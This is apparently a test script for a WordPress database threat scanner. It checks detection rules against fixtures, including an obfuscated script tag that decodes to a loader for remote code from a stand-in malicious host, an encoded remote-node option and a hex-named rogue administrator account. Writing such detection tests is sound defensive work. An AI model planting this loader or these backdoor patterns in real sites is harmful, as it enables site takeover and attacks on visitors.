#!/usr/bin/env bash
set -euo pipefail
ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"

php -d display_errors=1 -r '
require $argv[1];
function expect_rule($actual,$kind,$rule,$label){
    if(!is_array($actual)||($actual[0]??null)!==$kind||($actual[1]??null)!==$rule){
        fwrite(STDERR,"fixture failed: ".$label."\n"); exit(1);
    }
}
function expect_clean($actual,$label){
    if($actual!==null){fwrite(STDERR,"benign fixture falsely matched: ".$label."\n"); exit(1);}
}

$maliciousJs="<script>var s=document.createElement(\"script\");s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120,46,106,115);document.head.appendChild(s);</script>";
expect_rule(presswarden_db_classify_content($maliciousJs,"option"),"ALERT","PW-DB-001","obfuscated stored script loader");

$normalOption="<script src=\"https://cdn.example.com/app.js\"></script>";
expect_rule(presswarden_db_classify_content($normalOption,"option"),"REVIEW","PW-DB-003","legitimate-looking stored external script remains review-only");
expect_clean(presswarden_db_classify_content($normalOption,"post"),"ordinary post external script without obfuscation");

$nodes=base64_encode(json_encode(array(
    "https://node-a.example.invalid/data.txt",
    "https://node-b.example.invalid/data.txt"
)));
expect_rule(presswarden_db_classify_hex_remote_option("55e7183bded6e0fa810c47b04e65ea6e",$nodes),"ALERT","PW-DB-004","hex-keyed encoded remote-node list");

$oneHost=base64_encode(json_encode(array(
    "license"=>str_repeat("x",80),
    "endpoint"=>"https://api.example.com/v1/status"
)));
expect_clean(presswarden_db_classify_hex_remote_option("55e7183bded6e0fa810c47b04e65ea6e",$oneHost),"hex-keyed encoded application data with one remote host");
expect_clean(presswarden_db_classify_hex_remote_option("normal_plugin_cache_key",$nodes),"encoded node list under a normal option key");

$caps="a:1:{s:13:\"administrator\";b:1;}";
$hex="55e7183bded6e0fa810c47b04e65ea6e";
expect_rule(presswarden_db_classify_admin($hex,$hex."@113c971f77f8.example",$caps),"ALERT","PW-DB-005","matching hexadecimal rogue administrator identity");
expect_clean(presswarden_db_classify_admin("site-admin","site-admin@example.com",$caps),"normal administrator identity");
expect_clean(presswarden_db_classify_admin($hex,$hex."@example.com","a:1:{s:6:\"editor\";b:1;}"),"hex identity without administrator capability");

echo "PressWarden DB threat-intel fixtures: PASS\n";
' "$ROOTDIR/lib/db-threat-classify.php"
